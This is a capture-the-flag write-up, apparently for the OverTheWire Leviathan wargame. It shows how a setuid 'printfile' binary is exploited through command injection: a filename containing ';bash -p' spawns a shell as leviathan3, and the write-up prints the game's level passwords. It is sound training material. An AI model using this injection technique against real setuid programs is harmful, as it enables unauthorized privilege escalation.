**`leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3`**   
*`You cant have that file...`*  

Well that's odd; it won't let us print the contents of the leviathan3 password file, despite the binary having ownership permissions of `leviathan3`. Let's see what's going on under the hood:

**`leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3`**  
```
__libc_start_main(0x80491e6, 2, 0xffffd5d4, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                                                                                        = -1
puts("You cant have that file..."You cant have that file...
)                                                                                                                 = 27
+++ exited (status 1) +++
```

So it's using the `access()` function to determine whether I have read permissions for the referenced file. Since this returned a -1 in the `ltrace`, this fails, and then resorts to `puts()` to print that I don't have access. Let's try running this again with another file, one that we should definitely have read-access to:

**`leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2`**  
```
__libc_start_main(0x80491e6, 2, 0xffffd5d4, 0 <unfinished ...>

snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2")                                              = 39
geteuid()                                                                                                                                          = 12002
geteuid()                                                                                                                                          = 12002
setreuid(12002, 12002)                                                                                                                             = 0
system("/bin/cat /etc/leviathan_pass/lev"...mEh5PNl10e

+++ exited (status 0) +++
```

Here we go. There are several things going on here:
* The `access()` function checks whether we have read permissions to the file referenced in our setuid binary execution argument
* A string is built, using `snprintf()`, concatenating `/bin/cat` with the filename in question
* The `setreuid()` function sets both the real and effective UID to leviathan3
* The `system()` function calls the concatenated string built earlier and executes

As stated above, any "filename" (that we have read permissions for) that is passed to the concatenated string will be executed by `system()`, AFTER `setreuid()` sets the real/effective UID to leviathan3. We can therefore fool the `system()` function into accepting a filename with a command appended to it, otherwise known as a **command injection vulnerability**:

**`leviathan2@gibson:~$ mkdir /tmp/rajh`**  
**`leviathan2@gibson:~$ touch "/tmp/rajh/test;bash -p"`**  
**`leviathan2@gibson:~$ ./printfile "/tmp/rajh/test;bash -p"`**  
*`/bin/cat: /tmp/rajh/test: No such file or directory`*  
*`leviathan3@gibson:~$`*  

So rather than `./printfile` interpreting my referenced file as one file, it interpreted it as a file AND a command; it first executed `/bin/cat /tmp/rajh/test` (which didn't exist), and then executed `bash -p`, which spawned a shell as leviathan3.

**`leviathan3@gibson:~$ cat /etc/leviathan_pass/leviathan3`**  
*`Q0G8j4sakn`*
